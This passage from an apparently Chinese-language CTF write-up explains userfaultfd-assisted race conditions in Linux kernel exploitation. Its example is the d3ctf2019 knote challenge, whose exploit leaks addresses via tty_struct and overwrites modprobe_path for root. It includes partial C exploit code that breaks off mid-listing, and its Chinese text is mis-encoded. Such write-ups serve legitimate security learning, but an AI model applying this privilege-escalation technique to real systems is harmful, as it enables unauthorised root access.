class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>è‡ªå®šä¹‰å¤„ç†å‡½æ•°æ¨¡æ¿</strong></p>
<p>å¯ä»¥æŠŠè‡ªå®šä¹‰å¤„ç†å‡½æ•°åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œå‰åŠéƒ¨åˆ†å°±æ˜¯æ¨¡æ¿æ“ä½œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è½®è¯¢uffdè¯»åˆ°çš„ä¿¡æ¯éœ€è¦å­˜åœ¨ä¸€ä¸ªstruct uffd_msgå¯¹è±¡ä¸­</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line"><span class="comment">// ioctlçš„UFFDIO_COPYé€‰é¡¹éœ€è¦æˆ‘ä»¬æ„é€ ä¸€ä¸ªstruct uffdio_copyå¯¹è±¡</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">uffd = (<span class="keyword">long</span>) arg;</span><br></pre></td></tr></table></figure>

<p>ååŠéƒ¨åˆ†æ˜¯çœŸæ­£çš„å¤„ç†ä»£ç </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123; <span class="comment">// æ­¤çº¿ç¨‹ä¸æ–­è¿›è¡Œpollingï¼Œæ‰€ä»¥æ˜¯æ­»å¾ªç¯</span></span><br><span class="line">        <span class="comment">// polléœ€è¦æˆ‘ä»¬æ„é€ ä¸€ä¸ªstruct pollfdå¯¹è±¡</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="comment">// è¯»å‡ºuser-faultç›¸å…³ä¿¡æ¯</span></span><br><span class="line">        read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="comment">// å¯¹äºæˆ‘ä»¬æ‰€æ³¨å†Œçš„ä¸€èˆ¬user-faultåŠŸèƒ½ï¼Œéƒ½åº”æ˜¯UFFD_EVENT_PAGEFAULTè¿™ä¸ªäº‹ä»¶</span></span><br><span class="line">        assert(msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line">        <span class="comment">// æ„é€ uffdio_copyè¿›è€Œè°ƒç”¨ioctl-UFFDIO_COPYå¤„ç†è¿™ä¸ªuser-fault</span></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// page(æˆ‘ä»¬å·²æœ‰çš„ä¸€ä¸ªé¡µå¤§å°çš„æ•°æ®)ä¸­page_sizeå¤§å°çš„å†…å®¹å°†è¢«æ‹·è´åˆ°æ–°åˆ†é…çš„msg.arg.pagefault.addresså†…å­˜é¡µä¸­</span></span><br><span class="line">        ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy);</span><br><span class="line">          ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ç†æ¸…æ¥šäº†userfaultfdï¼Œé‚£å¯¹äºæ¡ä»¶ç«äº‰åˆæœ‰ä»€ä¹ˆç”¨å¤„å‘¢ï¼Œå¯ä»¥å…ˆçœ‹ä¸‹é¢è¿™æ®µä»£ç ,å¦‚æœè¿™æ®µä»£ç æ²¡æœ‰åŠ é”ï¼Œé‚£ä¹ˆå½“<code>copy_from_user</code>å‡½æ•°è¦å‘pträ½†è¿˜æ²¡å†™å…¥æ—¶ï¼Œæ­¤æ—¶å¦ä¸€ä¸ªçº¿ç¨‹æŠŠptrç»™freeæ‰ç„¶åå†æŠŠè¿™ä¸ªå †å—ç”³è¯·å›æ¥ï¼Œè¿™ä¸ªå †å—æ˜¯æ¯”è¾ƒç‰¹æ®Šçš„å †å—ï¼Œæ¯”å¦‚<code>tty_struct</code>,è¿™æ ·æˆ‘ä»¬å°±æ§åˆ¶äº†tty_struct,è¿›è€Œå¯ä»¥æ§åˆ¶ç¨‹åºæµäº†ï¼Œä½†æ˜¯è¿™æ ·æ¦‚ç‡ä¼šå¾ˆå°ï¼Œå¦‚æœè®¿é—®user_bufå‘ç”Ÿäº†ç¼ºé¡µå¼‚å¸¸ï¼Œé‚£å°±ä¼šåœä¸‹æ¥å»æ‰§è¡Œç¼ºé¡µå¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œå¤„ç†å®Œå†ç»§ç»­æ‰§è¡Œ<code>copy_from_user</code>å‡½æ•°ï¼Œå¦‚æœæˆ‘ä»¬åœ¨ç¼ºé¡µå¼‚å¸¸å¤„ç†å‡½æ•°ä¸­å†<code>sleep</code>ä¸€ä¸‹ï¼Œé‚£ç©ºæ¡£æœŸå°±éå¸¸é•¿äº†ï¼Œåœ¨è¿™æ®µæ—¶é—´é‡Œé‡Šæ”¾åœ¨ç”³è¯·ï¼Œæœ€åæˆåŠŸå†™çš„æ¦‚ç‡å°±å¾ˆå¤§äº†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ptr) &#123;  </span><br><span class="line">   ...  </span><br><span class="line">   copy_from_user(ptr,user_buf,len);  </span><br><span class="line">   ...  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>è¯´ç™½äº†ä½¿ç”¨userfaultfdå°±æ˜¯ä¸ºäº†æé«˜æ¡ä»¶ç«äº‰æˆåŠŸçš„æ¦‚ç‡ã€‚</p>
<p><strong>ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯5.11ç‰ˆæœ¬ä»¥åï¼Œéç‰¹æƒç”¨æˆ·å°±è¢«ç¦æ­¢ä½¿ç”¨userfaultfdäº†</strong></p>
<h4 id="ä¾‹é¢˜-d3ctf2019-knote"><a href="#ä¾‹é¢˜-d3ctf2019-knote" class="headerlink" title="ä¾‹é¢˜ d3ctf2019-knote"></a>ä¾‹é¢˜ d3ctf2019-knote</h4><p><strong>å¯åŠ¨è„šæœ¬</strong></p>
<p>è™šæ‹Ÿäº†ä¸¤ä¸ªcpu,æ¯ä¸ªcpuä¸€ä¸ªæ ¸ï¼Œæ‰€ä»¥å¯ä»¥æ”¯æŒä¸¤ä¸ªçº¿ç¨‹ã€‚ä¿æŠ¤é™¤äº†kptiæ²¡å¼€ä»¥å¤–å…¶ä»–çš„éƒ½å¼€äº†ã€‚</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./rootfs.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-smp cores=2,threads=1 \</span><br><span class="line">-cpu qemu64,+smep,+smap</span><br></pre></td></tr></table></figure>

<p><strong>æ–‡ä»¶ç³»ç»Ÿå¯åŠ¨è„šæœ¬</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&#123;==DBG==&#125; INIT SCRIPT&quot;</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line">mdev -s</span><br><span class="line"><span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;&#123;==DBG==&#125; Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">insmod note.ko</span><br><span class="line">mknod /dev/knote c 10 233</span><br><span class="line">chmod 666 /dev/knote</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">chown 0:0 /flag</span><br><span class="line">chmod 400 /flag</span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">chroot . setuidgid 1000 /bin/sh <span class="comment">#normal user</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜å°±æ˜¯åœ¨å†…æ ¸å®ç°äº†ä¸€ä¸ªèœå•å †ï¼Œæœ‰add,get,del,editå››ä¸ªåŠŸèƒ½ï¼Œå…¶ä¸­delå’Œaddæ˜¯åŠ äº†è¯»å†™é”çš„ï¼Œæ²¡æ³•æ¡ä»¶ç«äº‰ï¼Œä½†æ˜¯getå’Œeditæ˜¯å¯ä»¥çš„ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡getè¿›è¡Œæ¡ä»¶ç«äº‰æ¥å®Œæˆå†…æ ¸åœ°å€æ³„éœ²ï¼Œåœ¨è¿™ä¸ªå†…æ ¸ç‰ˆæœ¬ä¸­tty_structå¤§å°æ˜¯0x2e0,æ‰€ä»¥å¯ä»¥å…ˆç”³è¯·ä¸€ä¸ª0x2e0çš„å †ï¼Œç„¶ååœ¨getçš„æ—¶å€™æ¡ä»¶ç«äº‰ï¼Œåœ¨ç¼ºé¡µå¤„ç†çš„æ—¶å€™å…ˆæŠŠè¿™ä¸ªå †å—freeæ‰ï¼Œç„¶åå†æ‰“å¼€ä¸€ä¸ª<code>ptmx</code>ï¼Œå°±ä¼šåœ¨å†…æ ¸ç”³è¯·ä¸€ä¸ª0x2e0çš„å †ï¼Œæœ‰æ¦‚ç‡ç”³è¯·åˆ°åˆšfreeçš„å †å—ï¼Œç¼ºé¡µå¤„ç†å®Œå†è¿›è¡Œæ‹·è´çš„è¯å°±èƒ½å¾—åˆ°<code>tty_struct</code>çš„å†…å®¹äº†ï¼Œå°±èƒ½å¾—åˆ°å†…æ ¸åœ°å€äº†ï¼Œç„¶ååœ¨editçš„æ—¶å€™å†æ¬¡è¿›è¡Œæ¡ä»¶ç«äº‰å°±å¯ä»¥ä»»æ„åœ°å€å†™äº†ï¼Œä½†æ˜¯æ€ä¹ˆåˆ©ç”¨è¿™ä¸ªä»»æ„åœ°å€æå‡æƒé™å‘¢</p>
<p><strong>modprobe_path</strong></p>
<p>å½“åœ¨ç”¨æˆ·æ€ä½¿ç”¨<code>execve</code>æ‰§è¡Œä¸€ä¸ªéæ³•çš„æ–‡ä»¶çš„æ—¶å€™ï¼Œå†…æ ¸ä¼šæœ‰å¦‚ä¸‹è°ƒç”¨é“¾</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL_64()</span><br><span class="line">    sys_execve()</span><br><span class="line">        do_execve()</span><br><span class="line">            do_execveat_common()</span><br><span class="line">                bprm_execve()</span><br><span class="line">                    exec_binprm()</span><br><span class="line">                        search_binary_handler()</span><br><span class="line">                            __request_module() </span><br><span class="line">                                call_modprobe()</span><br></pre></td></tr></table></figure>

<p>æœ€åä¸€ä¸ªå‡½æ•°å®šä¹‰äº<code>/kernel/kmod.c</code>,ä¸‹é¢å°±æ˜¯é¢˜ç›®å†…æ ¸ç‰ˆæœ¬å¯¹åº”çš„<code>call_modprobe()</code>æºç ï¼Œåœ¨å‡½æ•°çš„æœ€åä¼šè°ƒç”¨<code>call_usermodehelper_exec()</code>å‡½æ•°ï¼Œå°†<code>modprobe_path</code>ä½œä¸ºå¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ï¼Œä»¥rootæƒé™å°†å…¶æ‰§è¡Œï¼Œ<code>modprobe_path</code>é»˜è®¤å­˜å‚¨ç€æ‰§è¡Œè·¯å¾„<code>/sbin/modprobe</code>.</p>
<p>æ‰€ä»¥å¯ä»¥é€šè¿‡ä»»æ„åœ°å€å†™æ¥è§¦<code>modprobe_path</code>,å°†å…¶æ”¹å†™ä¸ºæˆ‘ä»¬æ„é€ çš„æ¶æ„è„šæœ¬çš„è·¯å¾„ï¼Œç„¶åæ‰§è¡Œä¸€ä¸ªéæ³•æ–‡ä»¶è§¦å‘ä¸Šè¿°è°ƒç”¨é“¾ï¼Œæœ€åä»¥rootç”¨æˆ·æ‰§è¡Œæ¶æ„è„šæœ¬ï¼Œæ€è·¯å°±æ˜¯è¿™æ ·</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">call_modprobe</span><span class="params">(<span class="keyword">char</span> *module_name, <span class="keyword">int</span> wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123;</span><br><span class="line">		<span class="string">&quot;HOME=/&quot;</span>,</span><br><span class="line">		<span class="string">&quot;TERM=linux&quot;</span>,</span><br><span class="line">		<span class="string">&quot;PATH=/sbin:/usr/sbin:/bin:/usr/bin&quot;</span>,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> **argv = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">char</span> *[<span class="number">5</span>]), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!argv)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	module_name = kstrdup(module_name, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!module_name)</span><br><span class="line">		<span class="keyword">goto</span> free_argv;</span><br><span class="line"></span><br><span class="line">	argv[<span class="number">0</span>] = modprobe_path;</span><br><span class="line">	argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">	argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">	argv[<span class="number">3</span>] = module_name;	<span class="comment">/* check free_modprobe_argv() */</span></span><br><span class="line">	argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line">					 <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!info)</span><br><span class="line">		<span class="keyword">goto</span> free_module_name;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);</span><br><span class="line">free_module_name:</span><br><span class="line">	kfree(module_name);</span><br><span class="line">free_argv:</span><br><span class="line">	kfree(argv);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a><strong>exp</strong></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> tty_struct_size 0x2e0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> modprobe_path_offset 0x145c5c0</span></span><br><span class="line"><span class="keyword">char</span> *page;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_t</span> monitor_thread;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerUserFaultFd</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> (*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">fault_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span 